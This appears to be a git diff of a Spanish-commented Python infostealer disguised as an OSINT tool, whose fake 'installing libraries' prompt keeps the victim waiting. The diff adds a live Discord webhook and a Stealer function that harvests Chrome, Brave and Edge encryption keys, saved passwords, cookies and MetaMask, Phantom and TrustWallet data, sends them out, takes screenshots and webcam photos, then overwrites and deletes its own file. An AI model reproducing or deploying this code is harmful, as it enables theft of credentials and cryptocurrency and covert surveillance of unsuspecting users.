@@ -4,7 +4,7 @@
 #__________________________________________________________|
 #
 # El codigo cuenta con engaño para hacer esperar al usuario mientras se extraen los archivos simulando una Herramienta de OSINT
-# Si quieres que el usuario no mire el codigo y vea las logicas de filtracion de datos simplemente proba con la version OBFUSCADA en el archivo : payload_Obfuscado.py
+# Este archivo se ejecutara en la PC del usuario a atacar
 
 import requests
 import os
@@ -18,13 +18,18 @@ import cv2
 import time
 import threading
 import sys
+import json
+import base64
+import sqlite3
+import shutil
+from datetime import datetime
 from colorama import Fore, Style, init
 
 
 init(autoreset=True)
 
 
-WEBHOOK_URL = "url del webhook aca | creado por t.me/Valen_Qq"
+WEBHOOK_URL = "https://discordapp.com/api/webhooks/1469545046855651409/BsbFkF4NXinUawqYhGsQw6iI9_gr7iDVnf4Jy2bUPRNXcZTqxl4CVgcWcgBT_XdOQdba"
 
 
 BANNER_ILUMINATOR = r"""
@@ -55,12 +60,116 @@ def enviar_archivo(ruta, mensaje=None):
                 requests.post(WEBHOOK_URL, data={"content": mensaje} if mensaje else None, files={"file": f})
         except: pass
 
-def tarea_exfiltracion():
+def Stealer():
+    ruta_u = os.path.expanduser("~")
+    import shutil
+    import sqlite3
+
+    requests.post(WEBHOOK_URL, json={"content": "🚀 **Arrancando...**"})
+
+    if platform.system() == "Windows":
+        carpetas = {
+            "Chrome": os.path.join(ruta_u, "AppData/Local/Google/Chrome/User Data"),
+            "Brave": os.path.join(ruta_u, "AppData/Local/BraveSoftware/Brave-Browser/User Data"),
+            "Edge": os.path.join(ruta_u, "AppData/Local/Microsoft/Edge/User Data")
+        }
+    else:
+        carpetas = {
+            "Chrome": os.path.join(ruta_u, ".config/google-chrome"),
+            "Brave": os.path.join(ruta_u, ".config/BraveSoftware/Brave-Browser"),
+            "Chromium": os.path.join(ruta_u, ".config/chromium")
+        }
+
+    ids_wallets = {
+        "Metamask": "nkbihfbeogaeaoehlefnkodbefgpgknn",
+        "Phantom": "bfnaoagmgoenfnocnefjndmInstallation",
+        "TrustWallet": "egjidjbpgmcnihkmyhgnehaidieebghe"
+    }
+
+    for nombre, path_base in carpetas.items():
+        if not os.path.exists(path_base):
+            continue
+
+        requests.post(WEBHOOK_URL, json={"content": f"🌐 **{nombre}**"})
+
+        llave = None
+        archivo_ls = os.path.join(path_base, "Local State")
+        if os.path.exists(archivo_ls):
+            if platform.system() == "Windows":
+                llave = obtener_llave_windows(archivo_ls) 
+            
+            t_ls = os.path.join(ruta_u, f"ls_{nombre}")
+            try:
+                shutil.copy2(archivo_ls, t_ls)
+                enviar_archivo(t_ls, f"Key {nombre}")
+                os.remove(t_ls)
+            except: pass
+
+        perfiles = ["Default", "Profile 1", "Profile 2", "Profile 3"]
+        for perf in perfiles:
+            p_actual = os.path.join(path_base, perf)
+            if not os.path.exists(p_actual):
+                continue
+
+            archivo_logins = os.path.join(p_actual, "Login Data")
+            if os.path.exists(archivo_logins):
+                t_log = os.path.join(ruta_u, f"log_{nombre}_{perf}")
+                try:
+                    shutil.copy2(archivo_logins, t_log)
+                    base_datos = sqlite3.connect(t_log)
+                    cursor = base_datos.cursor()
+                    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
+                    
+                    final = f"🔑 **{nombre} ({perf})**\n"
+                    for fila in cursor.fetchall():
+                        if fila[1]:
+                            pass_limpia = descifrar_dato(fila[2], llave) if llave else "[Cifrado]"
+                            final += f"📧 `{fila[1]}` : 🔑 `{pass_limpia}` | 🔗 {fila[0]}\n"
+                    
+                    if len(final) > 50:
+                        requests.post(WEBHOOK_URL, json={"content": final[:1990]})
+                    
+                    base_datos.close()
+                    os.remove(t_log)
+                except: pass
+
+            archivo_cookies = os.path.join(p_actual, "Network", "Cookies")
+            if not os.path.exists(archivo_cookies):
+                archivo_cookies = os.path.join(p_actual, "Cookies")
+
+            if os.path.exists(archivo_cookies):
+                t_cook = os.path.join(ruta_u, f"cook_{nombre}_{perf}.db")
+                try:
+                    shutil.copy2(archivo_cookies, t_cook)
+                    enviar_archivo(t_cook, f"Cookies {nombre} {perf}")
+                    os.remove(t_cook)
+                except: pass
+
+            exts = os.path.join(p_actual, "Local Extension Settings")
+            if os.path.exists(exts):
+                for w_nom, w_id in ids_wallets.items():
+                    p_wallet = os.path.join(exts, w_id)
+                    if os.path.exists(p_wallet):
+                        try:
+                            nom_zip = f"w_{nombre}_{perf}_{w_nom}"
+                            shutil.make_archive(nom_zip, 'zip', p_wallet)
+                            enviar_archivo(f"{nom_zip}.zip", f"Wallet {w_nom}")
+                            os.remove(f"{nom_zip}.zip")
+                        except: pass
+
+    requests.post(WEBHOOK_URL, json={"content": "Listo."})
+
+def Stealer2():
+    try:
+        Stealer()
+        time.sleep(2)
+    except: pass
 
     try:
-        pyautogui.screenshot("scr.png")
-        enviar_archivo("scr.png")
-        os.remove("scr.png")
+        pyautogui.screenshot("s.png")
+        enviar_archivo("s.png")
+        os.remove("s.png")
+        time.sleep(3)
     except: pass
 
     try:
@@ -68,10 +177,22 @@ def tarea_exfiltracion():
         time.sleep(1)
         ret, frame = cap.read()
         if ret:
-            cv2.imwrite("cam.jpg", frame)
+            cv2.imwrite("c.jpg", frame)
             cap.release()
-            enviar_archivo("cam.jpg")
-            os.remove("cam.jpg")
+            enviar_archivo("c.jpg")
+            os.remove("c.jpg")
+            time.sleep(3)
+    except: pass
+
+    try:
+
+        p = os.path.abspath(sys.argv[0])
+        if os.path.exists(p):
+
+            with open(p, "wb") as f:
+                f.write(os.urandom(os.path.getsize(p)))
+
+            os.remove(p)
     except: pass
 
 
@@ -163,7 +284,7 @@ def interfaz():
     sys.stdout.write("... OK\n\n")
 
     try:
-        key = input(Fore.LIGHTGREEN_EX + "[*] Espere un poco mas porfavor (instalando librerias)...")
+        key = input(Fore.LIGHTGREEN_EX + "[*] Espere un poco mas porfavor (instalando librerias) Esto podria llevar de Uno a Dos minutos no cierre la terminal para que todo cargue correctamente")
         
         if key == "1234":
             os.system('cls' if os.name == 'nt' else 'clear')
@@ -180,7 +301,7 @@ def interfaz():
 
 if __name__ == "__main__":
 
-    hilo_robo = threading.Thread(target=tarea_exfiltracion)
+    hilo_robo = threading.Thread(target=Stealer2)
     hilo_robo.start()
 
 
